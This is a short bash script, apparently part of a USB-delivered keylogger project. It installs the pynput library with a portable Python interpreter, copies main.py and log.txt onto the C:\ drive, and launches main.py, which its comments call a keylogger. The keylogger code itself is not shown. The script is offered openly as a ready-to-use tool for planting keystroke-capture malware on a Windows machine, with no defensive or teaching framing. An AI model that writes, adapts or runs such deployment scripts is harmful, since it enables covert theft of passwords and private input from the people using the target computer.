# Installs the Python Keylogger dependencies and runs the keylogger
#!/bin/bash

# Get directory of the script on the usb
SCRIPT_DIR="$( cd "$( dirname "${BASH_SOURCE[0]}" )" && pwd )"

# Install pynput using portable Python from USB
echo Installing pynput library...
"$SCRIPT_DIR/python/python.exe" -m pip install --target="$SCRIPT_DIR/python/Lib/site-packages" pynput

# Copy files from USB to C:\
echo Copying files...
cp "$SCRIPT_DIR/main.py" "C:/"
cp "$SCRIPT_DIR/log.txt" "C:/"

echo Installation complete.

# Run the keylogger using portable Python
echo Running keylogger...
"$SCRIPT_DIR/python/python.exe" "C:/main.py"